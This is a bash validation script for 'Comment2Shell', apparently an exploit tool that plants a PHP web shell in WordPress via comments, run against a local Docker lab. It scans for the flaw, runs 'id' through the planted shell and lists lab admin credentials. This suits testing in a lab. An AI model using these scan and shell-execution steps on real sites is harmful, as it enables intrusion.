#!/bin/bash
# Comment2Shell quick validation.

echo "=========================================="
echo " Comment2Shell Validation"
echo "=========================================="
echo

TARGET="${1:-http://localhost}"
WP_CONTAINER="${WP_CONTAINER:-comment2shell-lab}"

echo "[1] Checking local lab..."
if curl -sf --max-time 3 -o /dev/null "$TARGET/" 2>/dev/null; then
    echo "    [OK] Lab reachable at $TARGET"
else
    echo "    [X] Lab not reachable at $TARGET"
    echo "        Start: cd docker && docker compose up -d && bash setup.sh"
fi

echo
echo "[2] Running scan..."
python3 comment2shell.py --scan -t "$TARGET" 2>&1 | grep -E "VULN|Results"

echo
echo "[3] Testing find_post_id..."
python3 -c "
import comment2shell as c2s
pid = c2s.find_post_id('$TARGET')
print(f'    Post ID: {pid}')
"

echo
echo "[4] Testing exec (if a shell exists)..."
SHELL_PATH=$(docker exec "$WP_CONTAINER" sh -c \
    'ls -1dt /var/www/html/wp-content/plugins/*/ 2>/dev/null | head -1' 2>/dev/null \
    | xargs -r -I{} basename {} 2>/dev/null || true)
if [ -n "$SHELL_PATH" ] && python3 comment2shell.py --exec -t "$TARGET" \
        --shell-path "${SHELL_PATH}/${SHELL_PATH}.php" -c "id" 2>&1 | grep -q "uid="; then
    echo "    [OK] Shell works (${SHELL_PATH}/${SHELL_PATH}.php)"
else
    echo "    [!] Shell not found (run the exploit first)"
fi

echo
echo "=========================================="
echo " Browser validation:"
echo "  1. Login: $TARGET/wp-login.php  (admin / Password123!)"
echo "  2. View:  $TARGET/?p=1"
echo "  3. Open DevTools console to watch document.title"
echo "=========================================="
